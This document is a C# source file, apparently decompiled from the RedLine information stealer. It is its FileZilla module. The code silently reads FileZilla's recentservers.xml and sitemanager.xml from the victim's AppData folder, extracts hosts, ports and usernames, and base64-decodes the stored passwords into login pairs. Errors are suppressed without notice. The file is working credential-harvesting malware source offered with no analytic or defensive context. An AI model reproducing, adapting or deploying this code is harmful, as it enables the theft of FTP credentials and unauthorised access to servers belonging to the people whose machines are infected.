using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;
using RedLine.Logic.Helpers;
using RedLine.Models;

namespace RedLine.Logic.FtpClients
{
	// Token: 0x02000061 RID: 97
	public static class FileZilla
	{
		// Token: 0x060002AA RID: 682 RVA: 0x0000BA08 File Offset: 0x00009C08
		public static List<LoginPair> ParseConnections()
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				string path = string.Format("{0}\\FileZilla\\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				string path2 = string.Format("{0}\\FileZilla\\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
				if (File.Exists(path))
				{
					list.AddRange(FileZilla.ParseCredentials(path));
				}
				if (File.Exists(path2))
				{
					list.AddRange(FileZilla.ParseCredentials(path2));
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060002AB RID: 683 RVA: 0x0000BA80 File Offset: 0x00009C80
		private static List<LoginPair> ParseCredentials(string Path)
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				XmlTextReader reader = new XmlTextReader(Path);
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(reader);
				foreach (object obj in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
				{
					LoginPair loginPair = FileZilla.ParseRecent((XmlNode)obj);
					if (loginPair.Login != "UNKNOWN" && loginPair.Host != "UNKNOWN")
					{
						list.Add(loginPair);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060002AC RID: 684 RVA: 0x0000BB40 File Offset: 0x00009D40
		private static LoginPair ParseRecent(XmlNode xmlNode)
		{
			LoginPair loginPair = new LoginPair();
			try
			{
				foreach (object obj in xmlNode.ChildNodes)
				{
					XmlNode xmlNode2 = (XmlNode)obj;
					if (xmlNode2.Name == "Host")
					{
						loginPair.Host = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Port")
					{
						loginPair.Host = loginPair.Host + ":" + xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "User")
					{
						loginPair.Login = xmlNode2.InnerText;
					}
					if (xmlNode2.Name == "Pass")
					{
						loginPair.Password = DecryptHelper.Base64Decode(xmlNode2.InnerText);
					}
				}
			}
			catch
			{
			}
			finally
			{
				loginPair.Login = (string.IsNullOrEmpty(loginPair.Login) ? "UNKNOWN" : loginPair.Login);
				loginPair.Host = (string.IsNullOrEmpty(loginPair.Host) ? "UNKNOWN" : loginPair.Host);
				loginPair.Password = (string.IsNullOrEmpty(loginPair.Password) ? "UNKNOWN" : loginPair.Password);
			}
			return loginPair;
		}
	}
}
